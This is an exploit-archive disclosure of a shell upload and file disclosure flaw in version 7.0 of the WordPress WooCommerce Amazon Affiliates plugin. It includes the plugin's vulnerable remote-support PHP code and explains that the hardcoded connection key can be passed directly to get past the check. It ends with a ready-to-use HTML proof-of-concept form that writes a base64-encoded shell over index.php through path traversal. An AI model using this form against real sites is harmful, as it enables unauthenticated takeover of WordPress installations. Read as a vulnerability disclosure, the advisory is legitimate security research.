@@ -1,0 +1,126 @@
+id: 23579
+date: 04/27/2015
+title: WordPress WooCommerce Amazon Affiliates 7.0 Shell Upload / File Disclosure Vulnerabilities
+author: Evex
+cves: 
+
+WooCommerce Amazon Affiliates Wordpress Plugin Unauthenicated Arbitrary
+File Upload & LFD
+Link:
+http://codecanyon.net/item/woocommerce-amazon-affiliates-wordpress-plugin/3057503
+Version: 7.0
+
+This Plugin is Vulnerable to Local File Disclosure and Remote Code Execute
+via Arbitrary File Upload.
+
+Vulnerability Code(Shorted):
+class abmRemoteSupport{
+
+    public function __construct(){
+        $this->load_config();
+        $this->validate_connection();
+        $this->triggers();
+    }
+
+    private function load_config(){
+        require_once( 'remote_init.php' );
+        $this->config = $aa_tunnel_config;
+
+        /*  in remote_init.php
+        *    $aa_tunnel_config = array(
+        *    "key" => "69efc4922575861f31125878597e97cf",
+        *    );
+        */
+    }
+
+    private function validate_connection(){
+        $coming_key = isset($_REQUEST['connection_key']) ?
+$_REQUEST['connection_key'] : '';
+        if( trim($coming_key) == "" || $coming_key != $this->config['key']
+){
+            $this->print_error( array('code' => 101,'msg' => "Invalid
+key!"), 'fatal' );
+        }
+        return true;
+    }
+
+    private function triggers(){
+        $action = isset($_REQUEST['action']) ? $_REQUEST['action'] : '';
+        if( $action == 'browse_folder' )
+            $this->browse_folder();
+        if( $action == 'open_file' )
+            $this->open_file();
+        if( $action == 'save_file' )
+            $this->save_file();
+        $this->print_response();
+    }
+
+    private function save_file(){
+        $file = isset($_REQUEST['file']) ? urldecode($_REQUEST['file']) :
+'';
+        $file_content = isset($_REQUEST['file_content']) ?
+@base64_decode($_REQUEST['file_content']) : '';
+        if( file_exists( $file )) {
+            $write_file = @file_put_contents( $file, $file_content );
+            if( $write_file ){
+                $this->response = array('status' => 'valid','file_path' =>
+$file,'file_type' => end( explode(".", $file ) ));
+            }else{
+                $this->response = array('status' => 'invalid','msg' =>
+'Unable to write on file','file_type' => end( explode(".", $file ) ),
+'file_path' => $file);
+            }
+        }
+    }
+
+    private function open_file()
+    {
+        $file = isset($_REQUEST['file']) ? $this->config['path'] .
+$_REQUEST['file'] : '';
+        if( file_exists( $file ) ) {
+            $file_content = file_get_contents( $file );
+            $this->response = array(
+                'status' => 'valid',
+                'file_path' => $file,
+                'file_type' => end( explode(".", $file ) ),
+                'file_name' => end( explode("/", $file ) ),
+                'file_alias' => md5( $file ),
+                'content' => $file_content
+            );
+        }
+    }
+
+    new abmRemoteSupport();
+Vulnerable Code End.
+
+so as you see it using authenication! in 'validate_connection' function its
+validating connection through checking the requested key with the defined
+one ($this->config['key']). the pass is an md5 value
+'69efc4922575861f31125878597e97cf' but when authenicating its comparing
+$_REQUEST['connection_key'] with '69efc4922575861f31125878597e97cf'
+Directly without encoding the requested key in md5. so it can be directly
+passed by passing the original value '69efc4922575861f31125878597e97cf'.
+
+Conclusion: 'remote_tunnel.php'?!! this looks a suspicious name though! its
+confusing if the vendor did this on purpose or not, because there is
+protections in other methods.
+
+Proof of Concept:
+<form action="
+http://wordpress/wp-content/plugins/wwc-amz-aff/modules/remote_support/remote_tunnel.php"
+method="post" >
+    <input type="hidden" name="connection_key"
+value="69efc4922575861f31125878597e97cf" >
+    <input name="action" value="save_file" ><br>
+    <input name="file" value="../../../index.php"><br>
+    <textarea name="file_content" >BASE64 ENCODED SHELL</textarea><br>
+    <input type="submit" ><br>
+</form>
+
+Timeline:
+Discovered - March 2015
+Vendor Contact - March 2015
+No Reply - April 2015
+Public Disclosure - April 2015
+
+#  0day.today [2023-03-24]  #
